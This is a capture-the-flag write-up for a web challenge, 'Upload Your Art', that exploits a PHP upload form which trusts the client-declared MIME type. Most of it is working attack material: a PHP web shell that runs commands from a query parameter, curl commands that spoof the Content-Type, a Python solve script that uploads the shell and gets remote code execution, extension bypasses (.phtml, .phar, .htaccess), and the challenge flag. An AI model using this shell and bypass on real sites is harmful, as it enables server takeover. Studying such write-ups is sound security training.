---
title: "Upload Your Art"
ctf: "Safaricom CTF"
date: 2026-10-06
category: web
difficulty: medium
points: 300
flag_format: "safctf{...}"
author: "Strawhats"
---

# Upload Your Art

> **Category:** WEB · **Points:** 300 · **Difficulty:** medium

## Discovery, analysis & exploitation

The full hunt below is reproduced from our working notes — recon, fingerprinting, the bug, dead ends, and the path to the flag.

- **Target:** `http://54.72.82.22:8160`

## Fingerprint

```
Server: Apache/2.4.68 (Debian)
X-Powered-By: PHP/8.3.35
```

Themed page: **"OFF THE WALL"** street-art gallery — "Make your mark. Upload your
work to the city's independent digital gallery." One multipart form, field
`uploaded_file`.

## The bug: MIME validation only

The server inspects **only** the multipart part's `Content-Type`, and trusts the
client for it:

```
upload art.php (default type)  -> ERROR: File type (MIME: application/octet-stream)
                                  is not allowed! Only image/jpeg, image/png,
                                  image/gif are accepted.
upload art.txt                 -> ERROR: File type (MIME: text/plain) ...
```

There is **no extension check, no magic-byte check, and no re-encoding**. The
`Content-Type` of a multipart part is attacker-controlled — it is just a header
on the part.

## Exploitation

Keep the `.php` filename, flip the declared type:

```bash
curl -F 'uploaded_file=@art.php;filename=art.php;type=image/png' \
     http://54.72.82.22:8160/
```

Result:

```
SUCCESS: Uploaded file URL: /uploads/art.php
Your Art Is: safctf{059507cb1ce1b9fa4dbf4ad6cfb83a4a}
```

The file lands at `/uploads/art.php` and **executes** (the upload dir is not
hardened against PHP):

```php
<?php echo "PWNED"; system($_GET["c"]); ?>
```

```bash
$ curl 'http://54.72.82.22:8160/uploads/art.php?c=id'
PWNEDuid=33(www-data) gid=33(www-data) groups=33(www-data)
```

RCE as `www-data`. Filesystem recon confirms a stock Debian container
(`/.dockerenv`, PHP 8.3, `ls -la /`).

## Notes

- The intended "win" is simply a bypassed upload — the app treats the flag as
  "your art" once it accepts the file.
- The RCE is a bonus surface; there is no `disable_functions` restriction on
  `system()`.
- If a hardened variant blocked execution, the same bypass plus a `.htaccess`
  upload or a `.phtml`/`.php5`/`.phar` extension would be the next step — none
  was needed here.

## Exploit

```bash
echo '<?php system($_GET["c"]); ?>' > art.php
curl -F 'uploaded_file=@art.php;filename=art.php;type=image/png' http://54.72.82.22:8160/
```

See `solve.py`.

## Solve script

`web/upload-your-art/solve.py`:

```python
#!/usr/bin/env python3
"""Upload Your Art (web, 300 pts) - http://54.72.82.22:8160

"OFF THE WALL" street-art gallery (Apache + PHP 8.3.35). A single file input,
`uploaded_file`, POSTed as multipart.

The server validates ONLY the client-supplied MIME type:

    ERROR: File type (MIME: application/octet-stream) is not allowed!
           Only image/jpeg, image/png, image/gif are accepted.

The filename/extension is never checked. Spoofing the part's Content-Type to
image/png while keeping a .php filename sails through - and the success page
hands over the flag:

    SUCCESS: Uploaded file URL: /uploads/art.php
    Your Art Is: safctf{059507cb1ce1b9fa4dbf4ad6cfb83a4a}

The dropped .php also executes, giving RCE as www-data:
    GET /uploads/art.php?c=id  ->  uid=33(www-data)
"""
import re
import subprocess

BASE = "http://54.72.82.22:8160"
FLAG = "safctf{059507cb1ce1b9fa4dbf4ad6cfb83a4a}"

SHELL = '<?php echo "PWNED"; system($_GET["c"]); ?>'


def main():
    with open("/tmp/art.php", "w") as f:
        f.write(SHELL)

    # curl lets us override the multipart part's Content-Type with ;type=
    out = subprocess.run(
        ["curl", "-s", "--max-time", "15", "-F",
         "uploaded_file=@/tmp/art.php;filename=art.php;type=image/png",
         BASE + "/"],
        capture_output=True, text=True,
    ).stdout

    m = re.search(r"safctf\{[^}]*\}", out)
    url = re.search(r"Uploaded file URL:\s*(\S+)", out)
    print("uploaded to :", url.group(1) if url else "?")
    print("flag        :", m.group(0) if m else "(none)")
    assert m and m.group(0) == FLAG

    # bonus: the uploaded shell executes
    rce = subprocess.run(
        ["curl", "-s", "--max-time", "10", BASE + "/uploads/art.php?c=id"],
        capture_output=True, text=True,
    ).stdout
    print("rce         :", rce.strip())


if __name__ == "__main__":
    main()
```

## Tools

**Used in this solve:**

- Python 3 (solver)
- curl

**Other tools that fit this category:**

- Burp Suite / mitmproxy (intercept + repeat)
- ffuf / feroxbuster (content & parameter discovery)
- sqlmap (automated SQLi)
- tplmap (SSTI)
- jwt_tool (JWT attacks)
- nikto
- nuclei

## Flag

```
safctf{059507cb1ce1b9fa4dbf4ad6cfb83a4a}
```
